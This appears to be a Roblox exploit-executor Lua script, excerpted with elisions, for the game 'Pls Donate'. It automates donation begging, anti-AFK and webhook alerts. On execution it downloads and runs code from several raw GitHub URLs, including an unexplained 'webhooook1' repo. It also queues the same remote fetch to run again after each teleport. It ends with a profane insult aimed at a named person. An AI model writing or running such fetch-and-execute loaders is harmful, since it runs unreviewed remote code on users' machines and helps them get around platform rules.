--By executing this script, you agree to the terms of service at github.com/pompompur1nn/plsdonate/main/TOS
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/loganonline/webhooook1/main/main"))()
--Anti-AFK
...
queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/loganonline/plsdonate/main/main'))()")
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/loganonline/ui/main/right"))()
...
if isfile("plsdonatesettings.txt") then
    ...
    if er ~= nil then
        task.spawn(function()
            ...
            errMsg.Text = tostring("Settings reset due to error: sorry for deleting your stuff :( ".. er)
            task.wait(15)
            errMsg:Destroy()
        end)
...
local sValues = {true, 30, true, 30, "#32CD32", 5, false, "", "Disabled", {"Thank you", "Thanks!", "ty :)", "The Quick Brown Fox Jumps Over The Lazy Dog!", "The FitnessGram™ Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues. The 20 meter pacer test will begin in 30 seconds. Line up at the start. The running speed starts slowly, but gets faster each minute after you hear this signal."}, false, "GOAL: $C / $G", false, "your text here", "#ffffff", true, false, {"Please donate", "I'm so close to my goal!", "donate to me", "please"}, 300, 60, false, 3, false}
...
Players.LocalPlayer.leaderstats.Raised.Changed:Connect(function()
    ...
    if getgenv().settings.webhookToggle and getgenv().settings.webhookBox then
        ...
        --Tries to grabs donation message from logs github.com/loganonline
        if string.find(logs[#logs].message, Players.LocalPlayer.DisplayName) then
            ...
            webhook(tostring("💰 Somebody donated(oh mah gaw) ".. Players.LocalPlayer.leaderstats.Raised.value - RaisedC.. " bobux to ".. Players.LocalPlayer.DisplayName.. " (Total: " .. Players.LocalPlayer.leaderstats.Raised.value.. ")"))
        end
    end
...
if game:GetService("CoreGui").imgui.Windows.Window.Title.Text == "Loading..." then
    game:GetService("CoreGui").imgui.Windows.Window.Title.Text = "hazem lacking - duo w, also goose better is a fucking skid who copies scripts, enjoy open source"
end
